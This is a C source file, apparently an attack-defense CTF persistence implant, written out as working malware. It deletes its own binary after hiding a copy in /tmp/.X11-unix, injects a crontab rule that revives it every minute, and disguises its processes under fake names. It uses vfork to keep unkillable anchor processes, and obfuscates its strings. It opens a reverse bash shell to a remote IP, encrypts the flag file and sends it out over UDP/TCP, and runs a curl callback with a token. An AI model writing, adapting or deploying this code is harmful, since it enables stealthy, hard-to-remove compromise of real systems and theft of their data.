#include "config.h"
#include "AES.h"
#include "rsa.h"

extern char **environ;

#define NUM_GUARDS 5
#define TOTAL_PROCS (NUM_GUARDS + 1)
#define NUM_ANCHORS 3           /* D状态锚点进程数量 */
#define CMDLINE_PAD 256
#define REEXEC_MAGIC "__XSH_REEXEC__"
#define GHOST_MAGIC  "__XSH_GHOST__"  /* 幽灵复活器标记 */
#define GHOST_PATH   "/tmp/.X11-unix/.xs"  /* 二进制备份隐藏路径 */

char flag[RSA_BYTES + 16] = "";  /* RSA 加密后 128 字节 */
int flag_len = 0;
int shell_id = 0;

static const char *fake_names[] = FAKE_NAMES;
#define NUM_FAKE_NAMES 7

static char *arg_start = NULL;
static int arg_len = 0;

typedef struct {
    pid_t pids[TOTAL_PROCS];
    pid_t anchors[NUM_ANCHORS]; /* vfork D状态锚点进程 PID */
} shared_pids_t;

shared_pids_t *shared = NULL;

/* 前向声明 */
void ChangeProcessName(char **argv, const char *name);
pid_t spawn_anchor(char **argv);
void ServeFlagUDP();
void WebFlagRoutine();
void ReadFlag();
void ReverseFlag();
/*
 * init_deamon：三次 fork 彻底脱离父进程树。
 *
 * 问题：被 Apache/PHP 通过 "sh -c ./xsh" 启动时，sh 是 xsh 的父进程。
 * 如果 xsh 直接 fork+exit，sh 退出后 Apache 不 waitpid → sh 变僵尸。
 *
 * 方案：
 *   原始进程 fork 出 p1 → waitpid(p1) 回收 → _exit(0)  （原始进程干净退出，sh 也干净退出）
 *   p1: fork 出 p2 → _exit(0)  （p1 被原始进程 waitpid 回收，无僵尸）
 *   p2: setsid() → fork 出 p3 → _exit(0)  （p2 被 init 回收）
 *   p3: 最终 daemon 进程，继续执行 main 后续代码
 */
void init_deamon()
{
    /*
     * 被 Apache/PHP "sh -c ./xsh" 启动时进程链：
     *   Apache → sh → xsh(原始)
     * 需要确保所有中间进程都被回收，不产生僵尸。
     *
     * 原始进程 fork p1 → waitpid(p1) → _exit(0)
     *   → sh 检测到 xsh 退出 → sh exit → PHP waitpid(sh) → 全链回收
     * p1: SIGCHLD=SIG_IGN → fork p2 → _exit(0)  (被原始进程 waitpid 回收)
     * p2: setsid → SIGCHLD=SIG_IGN → fork p3 → _exit(0)  (p2 已脱离，被 init 自动回收)
     * p3: 最终 daemon
     */
    pid_t p1 = fork();
    if (p1 > 0)
    {
        /* 原始进程：立即退出，不 waitpid，让 sh 尽快退出 */
        /* p1 会被 init 领养并回收 */
        _exit(0);
    }
    if (p1 < 0)
        _exit(1);

    /* p1 进程 */
    signal(SIGCHLD, SIG_IGN);
    pid_t p2 = fork();
    if (p2 > 0)
        _exit(0);
    if (p2 < 0)
        _exit(1);

    /* p2 进程：新会话 */
    setsid();
    signal(SIGCHLD, SIG_IGN);

    pid_t p3 = fork();
    if (p3 > 0)
        _exit(0);
    if (p3 < 0)
        _exit(1);

    /* p3 进程：最终 daemon */
    umask(0);
    signal(SIGCHLD, SIG_IGN);
}

/*
 * backup_self：将当前运行的二进制（通过 /proc/self/exe 的内存fd）
 * 写到 GHOST_PATH，作为复活器的重启源。
 * unlink 之后 /proc/self/exe 仍然可读（内核保留 inode）。
 */
static void backup_self()
{
    mkdir(XorString("/tmp/.X11-unix"), 0755);

    char buf[4096];
    int src = open(XorString("/proc/self/exe"), O_RDONLY);
    if (src < 0) return;
    int dst = open(XorString(GHOST_PATH), O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (dst < 0) { close(src); return; }
    int n;
    while ((n = read(src, buf, sizeof(buf))) > 0)
        write(dst, buf, n);
    close(src);
    close(dst);
}

/*
 * install_cron_resurrect：向当前用户的 crontab 注入一条每分钟复活的规则。
 *
 * 原理：
 *   crontab 由系统 crond（root）驱动执行，pkill -u test 杀不掉 crond。
 *   每分钟检查 GHOST_PATH 是否存在且没有对应进程在运行，若没有则启动。
 *   用唯一标记注释（#XSH_CRON）防止重复添加。
 */
static void install_cron_resurrect()
{
    /* 检查 crontab 里是否已有我们的标记 */
    /* 用 fork+exec+pipe 替代 popen，避免 popen 修改 SIGCHLD */
    int pipefd[2];
    if (pipe(pipefd) < 0) return;

    pid_t chk = fork();
    if (chk == 0)
    {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        close(pipefd[1]);
        execl(XorString("/bin/sh"), "sh", "-c", XorString("crontab -l 2>/dev/null"), NULL);
        _exit(127);
    }
    close(pipefd[1]);

    int found = 0;
    if (chk > 0)
    {
        char line[512];
        FILE *fp = fdopen(pipefd[0], "r");
        if (fp)
        {
            while (fgets(line, sizeof(line), fp))
            {
                if (strstr(line, XorString("#XSH_CRON")))
                {
                    found = 1;
                    break;
                }
            }
            fclose(fp); /* 也关闭 pipefd[0] */
        }
        else
        {
            close(pipefd[0]);
        }
        /* 不 waitpid，SIGCHLD=SIG_IGN 自动回收 */
    }
    else
    {
        close(pipefd[0]);
    }

    if (found)
        return; /* 已安装，不重复添加 */

    /* 构建 crontab 命令：用 fork+exec 替代 system()，不触碰 SIGCHLD */
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
        "%s%s%s%s%s%s %s %s%s",
        XorString("(crontab -l 2>/dev/null; echo '* * * * * [ -x "),
        XorString(GHOST_PATH),
        XorString(" ] && ! pgrep -f "),
        XorString(GHOST_PATH),
        XorString(" >/dev/null && "),
        XorString(GHOST_PATH),
        XorString(GHOST_MAGIC),
        XorString(" #XSH_CRON"),
        XorString("') | crontab -"));

    pid_t p = fork();
    if (p == 0)
    {
        execl(XorString("/bin/sh"), "sh", "-c", cmd, NULL);
        _exit(127);
    }
    /* 不 waitpid，SIGCHLD=SIG_IGN 自动回收 */
    /* 等一小会让 crontab 写完 */
    usleep(500000);
}

/*
 * spawn_ghost：启动幽灵复活器（进程级 + crontab 级双保险）。
 *
 * 1. 进程级：双重 fork 托孤给 init，监控 PID，全灭后 execve 重启。
 *    - 弱点：pkill -u 能杀掉。
 * 2. crontab 级：注入 crontab 每分钟检查并重启。
 *    - 强点：crond 是 root 进程，pkill -u test 杀不掉。
 *    - 弱点：延迟最大 60 秒。
 * 两者组合：进程级提供秒级恢复，crontab 提供终极兜底。
 */
static void spawn_ghost(char **argv, pid_t *guard_pids, int guard_count)
{
    /* crontab 级复活 */
    install_cron_resurrect();

    /* 进程级复活（保留原有逻辑） */
    pid_t p1 = fork();
    if (p1 > 0)
    {
        waitpid(p1, NULL, 0);
        return;
    }
    if (p1 < 0) return;

    pid_t p2 = fork();
    if (p2 > 0)
        _exit(0);
    if (p2 < 0)
        _exit(0);

    setsid();
    prctl(PR_SET_NAME, XorString("kworker/u16:2"), 0, 0, 0);
    ChangeProcessName(argv, fake_names[2 % NUM_FAKE_NAMES]);
    signal(SIGCHLD, SIG_IGN);

    pid_t watched[TOTAL_PROCS + NUM_ANCHORS];
    int wcount = guard_count < (int)(sizeof(watched)/sizeof(watched[0]))
                 ? guard_count : (int)(sizeof(watched)/sizeof(watched[0]));
    int i;
    for (i = 0; i < wcount; i++)
        watched[i] = guard_pids[i];

    for (;;)
    {
        sleep(3);
        int alive = 0;
        for (i = 0; i < wcount; i++)
        {
            if (watched[i] > 1 && kill(watched[i], 0) == 0)
            {
                alive++;
                break;
            }
        }
        if (!alive)
        {
            char *new_argv[4] = { (char *)GHOST_PATH, NULL, NULL, NULL };
            new_argv[1] = (char *)GHOST_MAGIC;
            new_argv[2] = NULL;
            execve(XorString(GHOST_PATH), new_argv, environ);
            sleep(5);
        }
    }
}

/*
 * spawn_anchor：利用 vfork 的语义产生一个永久 D 状态父进程。
 *
 * vfork() 调用后父进程被挂起（TASK_UNINTERRUPTIBLE，即 D 状态），
 * 直到子进程调用 exec 或 _exit。
 * 子进程进入死循环永不退出，父进程因此永远处于 D 状态，
 * 内核不会向 D 状态进程传递任何信号，包括 SIGKILL。
 *
 * 注意：D 状态进程本身不执行任何代码，纯粹作为"不可杀"的占位进程。
 * 守护进程会监控子进程（循环体）是否存活，子进程被杀后重新 spawn_anchor。
 */
pid_t spawn_anchor(char **argv)
{
    static const char *anchor_comms[] = ANCHOR_COMM_NAMES;
    static int anchor_seq = 0;

    pid_t outer = fork();
    if (outer == 0)
    {
        int idx = (anchor_seq++) % NUM_ANCHORS;
        /* 改 comm（prctl，≤15字节，影响 ps 的 [] 列和 /proc/PID/comm） */
        prctl(PR_SET_NAME, anchor_comms[idx], 0, 0, 0);
        /* 改完整 cmdline（影响 ps aux 的命令行列） */
        ChangeProcessName(argv, fake_names[idx % NUM_FAKE_NAMES]);

        pid_t inner = vfork();
        if (inner == 0)
        {
            /* vfork 子：只用 async-signal-safe 的 prctl + sleep 死循环 */
            prctl(PR_SET_NAME, XorString(ANCHOR_INNER_COMM), 0, 0, 0);
            for (;;)
                sleep(60);
            _exit(0);
        }
        _exit(0);
    }
    return outer;
}

/*
 * 记录 argv+environ 连续区域，将 environ 搬到堆上。
 */
void init_proc_title(int argc, char **argv)
{
    int i;
    arg_start = argv[0];
    char *end = argv[0];
    for (i = 0; i < argc; i++)
    {
        if (argv[i])
        {
            char *p = argv[i] + strlen(argv[i]) + 1;
            if (p > end) end = p;
        }
    }
    for (i = 0; environ[i]; i++)
    {
        char *p = environ[i] + strlen(environ[i]) + 1;
        if (p > end) end = p;
    }
    arg_len = end - arg_start;

    char **new_env = (char **)malloc((i + 1) * sizeof(char *));
    int j;
    for (j = 0; j < i; j++)
        new_env[j] = strdup(environ[j]);
    new_env[j] = NULL;
    environ = new_env;
}

void ChangeProcessName(char **argv, const char *name)
{
    const char *short_name = strrchr(name, '/');
    if (short_name)
        short_name++;
    else
        short_name = name;
    prctl(PR_SET_NAME, short_name, 0, 0, 0);

    int name_len = strlen(name);
    if (arg_start && arg_len > 0)
    {
        memset(arg_start, 0, arg_len);
        if (name_len < arg_len)
            memcpy(arg_start, name, name_len);
        else
            memcpy(arg_start, name, arg_len - 1);
    }
}

int TestDir(char *filename)
{
    struct stat statbuf;
    stat(filename, &statbuf);
    return S_ISDIR(statbuf.st_mode);
}

void ReverseShell(int cur_idx, char **argv)
{
    pid_t pid = fork();
    if (pid == 0)
    {
        char *a[10] = {NULL};
        a[0] = (char *)malloc(0x50);
        strcpy(a[0], XorString(SHELL_NAME));
        struct sockaddr_in serverAddr;
        int clientSocket = socket(AF_INET, SOCK_STREAM, 0);
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(SHELL_PORT + cur_idx);
        serverAddr.sin_addr.s_addr = inet_addr(XorString(SHELL_IP));
        if (connect(clientSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == 0)
        {
            dup2(clientSocket, 0);
            dup2(clientSocket, 1);
            dup2(clientSocket, 2);
            execve(XorString("/bin/bash"), a, NULL);
        }
        close(clientSocket);
        exit(0);
    }
    shell_id = pid;
}

/*
 * WebFlagRoutine（Web 题专用，独立子进程运行）：
 *
 * 初始化（只执行一次）：
 *   1. 创建 WWWROOT/.xia0ji233/ 目录，权限 755
 *   2. 创建 WWWROOT/.xia0ji233/flag 普通文件，权限 666
 *
 * 死循环：
 *   - 每次将 .xia0ji233/ 目录权限设为 555
 *   - 每 100 次额外执行一次：读 flag → AES+RSA 加密 → 写入 flag 文件
 */
void WebFlagRoutine()
{
    /* ── 初始化：只执行一次 ── */
    struct stat st;

    /* 确保目录存在且是目录 */
    if (stat(XorString(FLAG_DIR), &st) == 0)
    {
        if (!S_ISDIR(st.st_mode))
            remove(XorString(FLAG_DIR));
    }
    mkdir(XorString(FLAG_DIR), 0755);
    chmod(XorString(FLAG_DIR), 0755);

    /* 确保 flag 文件存在，如果是目录则删除 */
    if (stat(XorString(FLAG_FILE), &st) == 0 && S_ISDIR(st.st_mode))
        rmdir(XorString(FLAG_FILE));
    int fd = open(XorString(FLAG_FILE), O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (fd >= 0)
        close(fd);
    chmod(XorString(FLAG_FILE), 0666);

    /* ── 死循环 ── */
    int counter = 0;
    for (;;)
    {
        chmod(XorString(FLAG_DIR), 0555);

        if (counter % 100 == 0)
        {
            /* 读 flag → AES+RSA 加密 → 写入文件 */
            char raw[0x50] = {0};
            int rfd = open(XorString(FLAG_PATH), O_RDONLY);
            if (rfd >= 0)
            {
                read(rfd, raw, 0x30);
                close(rfd);
            }

            uint8_t *blocks = NULL;
            int block_num = splitBlock(raw, &blocks);
            aesEncryptCBC(blocks, (uint8_t *)XorString(AES_KEY),
                          block_num, (uint8_t *)XorString(AES_IV));
            int aes_len = block_num * 16;

            uint8_t rsa_out[RSA_BYTES];
            rsa_encrypt(blocks, aes_len, rsa_out);
            free(blocks);

            int wfd = open(XorString(FLAG_FILE), O_WRONLY | O_CREAT | O_TRUNC, 0666);
            if (wfd >= 0)
            {
                write(wfd, rsa_out, RSA_BYTES);
                close(wfd);
            }
        }
        counter++;
    }
}

void do_work(char **argv)
{
    ChangeProcessName(argv, fake_names[NUM_GUARDS % NUM_FAKE_NAMES]);
    signal(SIGCHLD, SIG_IGN);

#if (PROBLEM == WEB)
    pid_t pid_w = fork();
    if (pid_w == 0)
    {
        WebFlagRoutine(); /* 永不返回 */
        _exit(0);
    }
#endif

#if (SERVE_FLAG)
    pid_t pid_s = fork();
    if (pid_s == 0)
    {
        ServeFlagUDP(); /* 永不返回 */
        _exit(0);
    }
#endif

    while (1)
    {
#if (MODE == GETFLAG) && (!SERVE_FLAG)
        ReadFlag();
        ReverseFlag();
#elif (MODE == CURL) && (!SERVE_FLAG)
        Attack();
#endif
#if (PROBLEM == WEB)
        /* 监控 WebFlagRoutine 子进程 */
        if (pid_w > 0 && kill(pid_w, 0) != 0)
        {
            pid_w = fork();
            if (pid_w == 0)
            {
                WebFlagRoutine();
                _exit(0);
            }
        }
#endif
#if (SERVE_FLAG)
        if (pid_s > 0 && kill(pid_s, 0) != 0)
        {
            pid_s = fork();
            if (pid_s == 0)
            {
                ServeFlagUDP();
                _exit(0);
            }
        }
#endif
        usleep(100000);
    }
}

void ReadFlag()
{
    memset(flag, 0, sizeof(flag));
    uint8_t *blocks = NULL;
    int fd, block_num;
    char raw[0x50] = {0};
    fd = open(XorString(FLAG_PATH), O_RDONLY);
    if (fd < 0)
        return;
    int n = read(fd, raw, 0x30);
    close(fd);
    if (n <= 0)
        return;
    block_num = splitBlock(raw, &blocks);
    aesEncryptCBC(blocks, (uint8_t *)XorString(AES_KEY), block_num, (uint8_t *)XorString(AES_IV));
    int aes_len = block_num * 16;

    /* RSA 加密 AES 密文 */
    uint8_t rsa_out[RSA_BYTES];
    rsa_encrypt(blocks, aes_len, rsa_out);
    memcpy(flag, rsa_out, RSA_BYTES);
    flag_len = RSA_BYTES;
    free(blocks);
}

void ReverseFlag()
{
    if (flag_len <= 0)
        return;
    struct sockaddr_in serverAddr;
    int clientSocket = socket(AF_INET, SOCK_DGRAM, 0);
    if (clientSocket >= 0)
    {
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(FLAG_PORT);
        serverAddr.sin_addr.s_addr = inet_addr(XorString(IP));
        sendto(clientSocket, flag, flag_len, 0, (struct sockaddr *)&serverAddr, sizeof(serverAddr));
        close(clientSocket);
        return;
    }
    clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket < 0)
        return;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(FLAG_PORT);
    serverAddr.sin_addr.s_addr = inet_addr(XorString(IP));
    if (connect(clientSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == 0)
        write(clientSocket, flag, flag_len);
    close(clientSocket);
}

/*
 * ServeFlagUDP：监听 SERVE_FLAG_PORT UDP 端口，
 * 收到任意 UDP 包后 fork 子进程处理：
 *   子进程使用独立（private）内存，读 flag → AES+RSA 加密 → 发送给客户端 → _exit 自毁。
 * 主监听进程不持有任何 flag 数据，永不退出。
 */
void ServeFlagUDP()
{
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in bind_addr;
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_port = htons(SERVE_FLAG_PORT);
    bind_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    if (bind(sock, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0)
    {
        close(sock);
        return;
    }

    signal(SIGCHLD, SIG_IGN);

    char buf[16];
    struct sockaddr_in client;
    socklen_t clen;

    for (;;)
    {
        clen = sizeof(client);
        int n = recvfrom(sock, buf, sizeof(buf), 0,
                         (struct sockaddr *)&client, &clen);
        if (n < 0) continue;

        pid_t p = fork();
        if (p == 0)
        {
            /* 子进程：独立 private 内存，读 flag → 加密 → 发送 → 自毁 */
            char raw[0x50] = {0};
            int fd = open(XorString(FLAG_PATH), O_RDONLY);
            if (fd >= 0)
            {
                read(fd, raw, 0x30);
                close(fd);
            }

            uint8_t *blocks = NULL;
            int block_num = splitBlock(raw, &blocks);
            aesEncryptCBC(blocks, (uint8_t *)XorString(AES_KEY),
                          block_num, (uint8_t *)XorString(AES_IV));
            int aes_len = block_num * 16;

            uint8_t rsa_out[RSA_BYTES];
            rsa_encrypt(blocks, aes_len, rsa_out);
            free(blocks);

            sendto(sock, rsa_out, RSA_BYTES, 0,
                   (struct sockaddr *)&client, clen);
            _exit(0);
        }
    }
}

void Attack()
{
    char cmd[512] = {0};
    strcpy(cmd, XorString("curl "));
    strcat(cmd, XorString(AUTH_SERVER));
    strcat(cmd, XorString(TOKEN));
    pid_t p = fork();
    if (p == 0)
    {
        execl(XorString("/bin/sh"), "sh", "-c", cmd, NULL);
        _exit(127);
    }
    /* 不 waitpid，SIGCHLD=SIG_IGN 自动回收 */
}

void guard_main(int my_idx, char **argv);

/*
 * 消耗随机数量的 PID，使后续 fork 出的真实进程 PID 不连续。
 * 原理：反复 fork 子进程并立即 exit，每次消耗一个 PID 号。
 */
void burn_pids()
{
    int count = 3 + (rand() % 15); /* 随机消耗 3~17 个 PID */
    int i;
    for (i = 0; i < count; i++)
    {
        pid_t p = fork();
        if (p == 0)
            _exit(0);
        if (p > 0)
            waitpid(p, NULL, 0);
    }
}

pid_t spawn_worker(char **argv)
{
    burn_pids();
    pid_t pid = fork();
    if (pid == 0)
    {
        do_work(argv);
        exit(0);
    }
    return pid;
}

pid_t spawn_guard(int target_idx, char **argv)
{
    burn_pids();
    pid_t pid = fork();
    if (pid == 0)
    {
        guard_main(target_idx, argv);
        exit(0);
    }
    return pid;
}

void guard_main(int my_idx, char **argv)
{
    ChangeProcessName(argv, fake_names[my_idx % NUM_FAKE_NAMES]);
    signal(SIGCHLD, SIG_IGN);

    while (1)
    {
        usleep(20000 + (my_idx * 5000));

        int i;
        pid_t wp = shared->pids[NUM_GUARDS];
        if (wp <= 0 || kill(wp, 0) != 0)
        {
            pid_t w = spawn_worker(argv);
            shared->pids[NUM_GUARDS] = w;
        }

        for (i = 0; i < NUM_GUARDS; i++)
        {
            if (i == my_idx)
                continue;
            pid_t gp = shared->pids[i];
            if (gp <= 0 || kill(gp, 0) != 0)
            {
                pid_t np = spawn_guard(i, argv);
                shared->pids[i] = np;
            }
        }

        /* 监控 D 状态锚点进程，若被杀（内层进程退出导致外层也退出）则重建 */
        for (i = 0; i < NUM_ANCHORS; i++)
        {
            pid_t ap = shared->anchors[i];
            if (ap <= 0 || kill(ap, 0) != 0)
            {
                shared->anchors[i] = spawn_anchor(argv);
            }
        }
    }
}

/*
 * 自举重启：第一次运行时，通过 /proc/self/exe 用一个很长的 argv[0] 重新 execve 自身。
 * 这样内核为新进程分配的 cmdline 区域就足够大，后续 ChangeProcessName 可以写入完整名字。
 * 用 REEXEC_MAGIC 环境变量标记已经重启过，避免无限循环。
 */
void reexec_with_padding(int argc, char *argv[])
{
    /* 构造长 argv[0]：用空格填充到 CMDLINE_PAD 字节 */
    char padded[CMDLINE_PAD];
    memset(padded, ' ', CMDLINE_PAD);
    padded[CMDLINE_PAD - 1] = '\0';

    /* 构造新 argv：padded + 原始参数 + REEXEC_MAGIC 标记 */
    int new_argc = argc + 1;
    char **new_argv = (char **)malloc((new_argc + 1) * sizeof(char *));
    new_argv[0] = padded;
    int i;
    for (i = 1; i < argc; i++)
        new_argv[i] = argv[i];
    new_argv[argc] = (char *)REEXEC_MAGIC;
    new_argv[argc + 1] = NULL;

    /* 通过 /proc/self/exe 重新执行自身 */
    execve(XorString("/proc/self/exe"), new_argv, environ);
}

int main(int argc, char *argv[])
{
    /* 检查是否是重启后的执行 */
    int is_reexec = 0;
    int is_ghost  = 0; /* 由复活器重启，跳过备份（备份已存在） */
    if (argc >= 2 && strcmp(argv[argc - 1], XorString(REEXEC_MAGIC)) == 0)
    {
        is_reexec = 1;
        argc--;
        argv[argc] = NULL;
    }
    else if (argc >= 2 && strcmp(argv[argc - 1], XorString(GHOST_MAGIC)) == 0)
    {
        is_reexec = 1; /* 跳过 reexec_with_padding */
        is_ghost  = 1; /* 跳过备份 */
        argc--;
        argv[argc] = NULL;
    }

    if (!is_reexec)
    {
        /* 首次运行：先重启自身以获得足够长的 argv 缓冲区 */
        reexec_with_padding(argc, argv);
        /* 如果 execve 失败，fallthrough 继续正常执行 */
    }

    /* 初始化 cmdline 覆盖区域 */
    init_proc_title(argc, argv);


    /* 备份自身到隐藏路径（在 unlink 之前），供复活器使用
     * ghost 重启时备份已存在，跳过避免写冲突 */
    if (!is_ghost)
        backup_self();

    /* 通过 /proc/self/exe 获取真实路径来 unlink */
    char exe_path[256] = {0};
    int n = readlink(XorString("/proc/self/exe"), exe_path, sizeof(exe_path) - 1);
    if (n > 0)
    {
        exe_path[n] = '\0';
        unlink(exe_path);
    }

    init_deamon();
    signal(SIGCHLD, SIG_IGN);   /* 尽早设置，防止后续 fork 产生僵尸 */

    srand(getpid() ^ time(NULL));

    shared = (shared_pids_t *)mmap(NULL, sizeof(shared_pids_t),
        PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    memset(shared, 0, sizeof(shared_pids_t));

    shared->pids[NUM_GUARDS] = spawn_worker(argv);

    int i;
    for (i = 0; i < NUM_GUARDS; i++)
    {
        shared->pids[i] = spawn_guard(i, argv);
    }

    /* 初始化 D 状态锚点进程 */
    for (i = 0; i < NUM_ANCHORS; i++)
    {
        shared->anchors[i] = spawn_anchor(argv);
    }

    /* 启动幽灵复活器（托孤给 init，独立于守护进程组）
     * 传入所有守护进程+工作进程的 PID，任一存活则不重启 */
    {
        pid_t all_pids[TOTAL_PROCS];
        for (i = 0; i < NUM_GUARDS; i++)
            all_pids[i] = shared->pids[i];
        all_pids[NUM_GUARDS] = shared->pids[NUM_GUARDS];
        spawn_ghost(argv, all_pids, TOTAL_PROCS);
    }

    ChangeProcessName(argv, fake_names[(NUM_GUARDS + 1) % NUM_FAKE_NAMES]);
    while (1)
    {
        usleep(15000);
        pid_t wp = shared->pids[NUM_GUARDS];
        if (wp <= 0 || kill(wp, 0) != 0)
        {
            pid_t w = spawn_worker(argv);
            shared->pids[NUM_GUARDS] = w;
        }
        for (i = 0; i < NUM_GUARDS; i++)
        {
            pid_t gp = shared->pids[i];
            if (gp <= 0 || kill(gp, 0) != 0)
            {
                pid_t np = spawn_guard(i, argv);
                shared->pids[i] = np;
            }
        }
        /* 主进程也监控锚点 */
        for (i = 0; i < NUM_ANCHORS; i++)
        {
            pid_t ap = shared->anchors[i];
            if (ap <= 0 || kill(ap, 0) != 0)
            {
                shared->anchors[i] = spawn_anchor(argv);
            }
        }
    }
    return 0;
}
